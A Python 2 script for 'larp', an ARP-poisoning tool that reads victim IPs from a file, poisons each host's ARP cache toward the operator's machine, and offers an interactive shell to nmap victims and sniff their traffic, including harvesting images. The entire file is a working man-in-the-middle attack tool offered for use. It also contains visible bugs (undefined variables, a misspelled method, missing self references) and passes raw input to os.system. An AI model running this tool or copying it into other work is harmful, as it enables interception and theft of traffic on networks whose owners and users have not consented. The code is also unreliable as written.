#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Script made by papi
#
# Arp poisonning tool used for retreiving data
# provide it a file named host.txt for the hosts he has to arp
# provide it an argument with the gateway ip
# it will arp the entire network to your' machine
# use threading to arp individual clients
# and setup a shell so that when you send an id it stops certain arps
import sys, os
import multiprocessing
import subprocess

import arp
import sniffer

from scapy.all import *
from termcolor import colored

class larp():
    '''-*- larp class -*-
        larp is software made by papi for arp poisonning
    '''

    def __init__(self, gateway_ip, interface, file_name, verbose, v=0):
        # setup all of the variables and the configurations
        print colored("[*] Starting up...", "green")    # startup_msg

        # this line had to be commented it threw up interface errors on my system
        #conf.iface = interface                          # interface var
        conf.verb = v                                   # configure verbose mode
        self.verbose = verbose
        self.interface = interface                      # save interface
        self.g_ip = gateway_ip                          # setup gateway_ip
        self.g_mac = arp.get_mac(self.g_ip)                 # get the gateway mac
        self.t_ip = []                                  # target_ip list
        self.t_mac = dict()                             # map ip -> mac addr
        self.thread_array = []                          # thread array
        self.id_map = dict()
        self.sniffer_proc_id = []                       # variable to control the sniffers

        if self.verbose:
            print "Openning file"
        try:                                            # get all of the ip addr's
            with open(file_name, "r") as f:             # open up the target ip file
                temp_ip = f.readlines()                 # get teh ip from the file
                temp_ip = [ x.strip() for x in temp_ip ]
                f.close()                               # remove EOL and close file
            arp.ip_forward()
            print colored("[*] Retreiving mac addrs", "green")
            print "IP addr -> ",
            print temp+ip
            for ip in temp_ip:
                temp = arp.get_mac(ip)
                if temp == None:
                    print colored("[!] Skipping %s, mac addr is None" % ip, "red")
                elif ip == gateway_ip:
                    print colored("[!] Skipping %s, it's the gateway" % ip, "red")
                else:
                    self.t_ip.append(ip)
                    self.t_mac[ip] = temp               # retrieving mac addrs

        except:
            self.error("file provided does not exist and permission error")

        print colored("[*] Setup finished!", "green")

    def error(self, msg=""):
        ''' function to display errors '''
        print >> sys.stderr, colored(msg, 'red')
        sys.exit(-1)

    def get_ip_mac(self, buf):
        # id_map[int(buf)][0], id_map[int(buf)][1]
        ip = self.id_map[int(buf)][0]
        mac = self.id_map[int(buf)][1]
        id_no = int(buf)
        return id_no, ip, mac

    def process_cmd(self, t_id, buf):
        if "all" in buf or "a" == buf:

            for i in xrange(0, t_id):
                self.thread_array[i].terminate()
                arp.restore_target(self.g_ip, self.g_mac, self.id_map[i][0], self.id_map[i][1])
                print colored("[^] Restored: %s" % self.id_map[i][0], "blue")
                if self.id_map[i][2] is not None:
                    self.id_map[i][2].terminate()
                    print colored("[^] Stoped sniffer for %s" % self.id_map[i][0], "blue")
                del self.id_map[i]

            for i in xrange(0, len(self.sniffer_proc_id)):
                self.sniffer_proc_id[i].terminate()
                self.sniffer_proc_id[i].join()

        elif "list" in buf or "l" == buf:

            for i in xrange(0, t_id):
                print colored("[^] %d => %s / %s" % (i, self.id_map[i][0], self.id_map[i][1]), "blue")
            print colored("[^] no of sniffers: %d" % (len(self.sniffer_proc_id)), "blue")

        elif "nmap" in buf or "n" == buf.split(' ')[0]:

            if buf.split(' ')[0] == 'n':
                i, ip, mac = self.get_ip_mac(buf.split(' ')[1])
                print colored("[^] running nmap on %d => %s" % (i, ip), "blue")
                print colored("[*] Output:", "green")
                os.system("nmap %s" % ip)
            else:
                buffer_array = buf.split(' ')
                l = len(buffer_array)
                print colored("[^] running nmap on %d => %s"\
                   % (int(buffer_array[l-1]), self.id_map[int(buffer_array[l-1])][0]), "blue")
                print colored("[*] Output:", "green")
                os.system("%s %s" % (str(buffer_array[:l-2]), self.id_map[int(buffer_array[l-1])][0]))

        elif "sniff" in buf or "s" == buf.split(' ')[0]:

            snif = sniffer.sniffer(self.interface)
            if buf.split(' ')[0] == 's':
                print colored("[^] running sniffer for images", "blue")
                self.sniffer_proc_id.append(multiprocessing.Process(target=snif.img_sniff,\
                        args=()))
                self.sniffer_proc_id[len(self.sniffer_proc_id)-1].start()
            else:
                buf_array = buf.split(' ')
                filter_str = ' '.join(buf_array[1:])
                print colored("[^] running sniffer with rule %s" % \
                        (filter_str), "blue")
                self.sniffer_proc_id.append(multiprocessing.Process(target=snif.sniff,\
                        args=(filter_str,)))
                self.sniffer_proc_id[len(self.sniffer_proc_id)-1].start()

        elif buf.isdigit():

            if len(self.thread_array) > int(buf):
                i, ip, mac = get_ip_mac(buf)
                self.thread_array[i].terminate()
                arp.restore_target(self.g_ip, self.g_mac, ip, mac)
                print colored("[^] Restored: %s" % ip, "blue")

                if self.id_map[int(buf)][2] != None:
                    self.id_map[int(buf)][2].termincate()
                    print colored("[^] Stoped sniffer for %s" % ip, "blue")

                del id_map[i]
            else:
                print colored("[!] are you trying to break this?!", "red")

        else:
            print colored("[!] Available commands: all - list - sniff - nmap - img", "red")

    def main(self):
        ''' main function '''
        t_id = 0    # thread id

        print colored("[*] Main Thread", "green")
        print colored("[^] Starting ARP poison", "blue")

        for ip in self.t_ip:                    # start the arp on every client
            self.thread_array.append(multiprocessing.Process(target=arp.poison,\
            args=(self.g_ip, self.g_mac, ip, self.t_mac[ip])))
            self.thread_array[t_id].start()
            self.id_map[t_id] = [ip, self.t_mac[ip], None , None]
            # id_mapper  ip |  mac addr |  if sniffing|if in img harvest
            t_id += 1

        print self.id_map
        print colored("[*] Main menu:\n[*] Number of client's: %d" % t_id, "green")

        while len(self.id_map):
            buf = raw_input('#>')               # display the prompt

            self.process_cmd(t_id, buf)               # process the command

        for thread in self.thread_array:
            thread.join()

